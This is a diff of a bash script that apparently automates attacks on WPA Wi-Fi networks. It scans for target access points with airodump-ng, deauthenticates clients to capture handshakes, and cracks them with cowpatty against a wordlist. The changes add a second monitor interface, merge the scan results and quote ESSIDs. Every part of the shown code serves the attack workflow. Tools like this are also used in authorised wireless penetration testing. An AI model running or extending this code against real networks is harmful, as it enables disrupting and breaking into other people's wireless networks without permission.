@@ -239,16 +239,28 @@ pyrit"""
 fapscan()																#Grep for AP ESSID
 {
 	clear
-	gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+	if [ $NIC2 -z ] 2> /dev/null
+		then
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+		else
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t 'Scanning...' --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt WPA&
+	fi
 	echo $BLU" [*] Scanning for AP's with names like $GRN$PARTIALESSID$BLU [*] "$RST
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
 			if [ -f $HOME/tmp-01.csv ] 2> /dev/null
 				then
-					DONE=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID)
-					ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
-					BSSID=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
+					if [ -f $HOME/tmpe-01.csv ]
+						then
+							TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | sort -u)"
+						else
+							TMPF="$(cat $HOME/tmp-01.csv)"
+					fi
+					DONE=$(echo "$TMPF" | grep $PARTIALESSID)
+					ESSID=$(echo "$TMPF" | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
+					BSSID=$(echo "$TMPF" | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
 			fi
 			if [ $ESSID -z ] 2> /dev/null
 				then
@@ -262,8 +274,9 @@ fapscan()																#Grep for AP ESSID
 	sleep 0.5
 	killall airodump-ng
 	ESSID=${ESSID:1}
-	CHAN=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
+	CHAN=$(echo "$TMPF" | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
+	echo "$TMPF" > $HOME/tmp-01.csv
 	fclientscan
 }
 
@@ -526,7 +539,7 @@ fautobot()																#Automagically find new target clients
  [*] Channel: $CHAN
  [*] Power: $POWER"""
 			echo $RED" [*] We need this handshake [*] "$RST
-			DEPASS=""
+			
 			if [ $EVIL = 1 ] 2> /dev/null
 				then
 					CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n1)
@@ -598,7 +611,12 @@ fautocap()																#Deauth targets and collect handshakes
 				then
 					A=1
 				else
-					TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+					if [ $NIC2 -z ] 2> /dev/null
+						then
+							TMPF="$(cat $HOME/tmp-01.csv)"
+						else
+							TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
+					fi
 					for OCLI in $TARGETS
 						do
 							POWER=$(echo "$TMPF" | grep "$OCLI" | cut -d ',' -f 4)
@@ -606,7 +624,7 @@ fautocap()																#Deauth targets and collect handshakes
 							echo "$OCLI $POWER" >> $HOME/tmpp
 						done
 					
-					POWERLIST=$(cat $HOME/tmpp)
+					POWERLIST="$(cat $HOME/tmpp)"
 					for OCLI in $POWERLIST
 						do
 							if [ $(echo $OCLI | cut -d ' ' -f 2) -le $POWERLIMIT ] 2> /dev/null
@@ -709,7 +727,6 @@ fautocap()																#Deauth targets and collect handshakes
 			fi
 			echo
 			echo $BLU" [*] Analyzing pcap for handshake [*] "$RST
-			EDONE=""
 			fanalyze
 			if [[ $DO = 'A' || $DEAU = "1" ]] 2> /dev.null
 				then
@@ -816,7 +833,7 @@ fautocap()																#Deauth targets and collect handshakes
 			fi
 	fi
 	sleep 0.4
-	EDONE="";GDONE="";TARGETS="";BSSIDS=""
+	EDONE="";GDONE="";TARGETS="";BSSIDS="";LOCATION="";URL=""
 	echo
 	rm -rf $HOME/tmp*
 	sleep 2
@@ -843,7 +860,7 @@ fautocap()																#Deauth targets and collect handshakes
 
 fanalyze()																#Analyze pcap for handshakes
 {
-	GDONE=""
+	GDONE="";EDONE="";ANALYZE="";ANALYZE2=""
 	ANALYZE=$(cowpatty -r $HOME/tmp-01.cap -c)
 	if [ $NIC2 -z ] 2> /dev/null
 		then
@@ -869,6 +886,8 @@ fanalyze()																#Analyze pcap for handshakes
 
 fcrack()																#Crack handshakes
 {
+	PFILE=$OUTDIR/$ESSID-$DATE".cap"
+	ESSID=$(echo $ESSID | sed 's/_/ /g')
 	clear
 	if [ $WORDLIST -z ] 2> /dev/null
 		then
@@ -892,11 +911,11 @@ fcrack()																#Crack handshakes
 							echo $RST
 						else
 							echo $BLU
-							cowpatty -f $WORDLIST -s $ESSID -r $OUTDIR/$ESSID-$DATE".cap"
+							cowpatty -f $WORDLIST -s "$ESSID" -r $PFILE
 							echo $RST
 					fi
 				else
-					echo $BLU;cowpatty -r $CAPF -s $ESSID -f $WORDLIST
+					echo $BLU;cowpatty -r $CAPF -s "$ESSID" -f $WORDLIST
 					fexit
 			fi
 	fi
